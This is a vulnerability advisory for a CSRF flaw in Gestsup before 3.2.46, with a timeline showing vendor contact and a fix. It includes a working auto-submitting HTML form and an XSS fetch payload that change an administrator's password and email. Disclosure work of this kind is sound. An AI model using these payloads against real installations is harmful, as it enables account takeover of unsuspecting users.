# CVE-2023-52060

## Summary

| ID                    | CVE-2023-52060                                           |
|-----------------------|----------------------------------------------------------|
| **Type**              | CSRF                                                     |
| **Title**             | CSRF on profile's information change request             |
| **Product impacted**  | Gestsup                                                  |
| **Impacted version**  | < 3.2.46                                                 |
| **CVSS Score**        | 5.4                                                      |
| **Author**            | Sopalinge                                                |

## Description

A lack of CSRF protection in the request to edit a user's profile information in Gestsup < 3.2.46 allows attackers to perform a Cross-Site Request Forgery (CSRF) attack.

The `index.php?page=admin/user&action=edit&userid=1&tab=infos` endpoint can be exploited to craft a malicious POST request which can be used to trick users into unknowingly changing their information, including email address and password.


## Impact

An attacker could trick another user into unknowingly changing their password when visiting a malicious website. Note that the SameSite attribute is not defined which means that the behaviour will depend on the victim's browser.

Combined with [CVE-2023-52059](../CVE-2023-52059/README.md), it can be used to take over privileged accounts directly from the Gestsup application.


## Proof of concept
### CSRF

The following HTTP code can be hosted on a malicious website. A user tricked into visiting this page has a risk (depedning on multiple factors like the browser used) to have his password, email and function edited.

```
<form id="autosubmit" action="http://localhost:3010/gestsup/index.php?page=admin/user&action=edit&userid=1&tab=infos" method="POST">
    <input type="hidden" name="attachment" value="0" />
    <input type="hidden" name="language" value="fr_FR" />
    <input type="hidden" name="profile" value="4" />
    <input type="hidden" name="firstname" value="admin" />
    <input type="hidden" name="lastname" value="" />
    <input type="hidden" name="login" value="admin" />
    <input type="hidden" name="password" value="admin" />
    <input type="hidden" name="password2" value="admin" />
    <input type="hidden" name="mail" value="admin@example.com" />
    <input type="hidden" name="function" value="hacked" />
    <input type="hidden" name="modify" value="modify" />
    <input type="submit" value="Submit request" />
</form>
<script>
    document.getElementById("autosubmit").submit();
</script>
```

![CSRF PoC](./assets/csrf.mp4)

### XSS and CSRF

Using [CVE-2023-52059](../CVE-2023-52059/README.md) in the `Description` or `Resolution` fields, the following payload can be injected in the intercepted request to exploit the CSRF to change the pasword, email and function of any user viewing the ticket :

```
<img src=x onerror="fetch('./index.php?page=admin/user&action=edit&userid=1&tab=infos', {method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'},body: 'attachment=0&language=fr_FR&profile=4&firstname=admin&lastname=&login=admin&password=admin&password2=admin&mail=admin@example.com&function=hacked&modify=modify'})" />
```

![XSS and CSRF PoC](./assets/xss_and_csrf.mp4)


## Timeline

- 24/12/2023 : Vulnerability discovered
- 24/12/2023 : Vendor contacted
- 25/12/2023 : Official fix published
- 25/01/2024 : CVE ID attributed
- ??/01/2024 : CVE publicly disclosed


## References

- [Gestsup website](https://gestsup.fr/index.php?page=home)
- [Fixing patch](https://gestsup.fr/index.php?page=download&channel=beta&version=3.2.46&type=patch)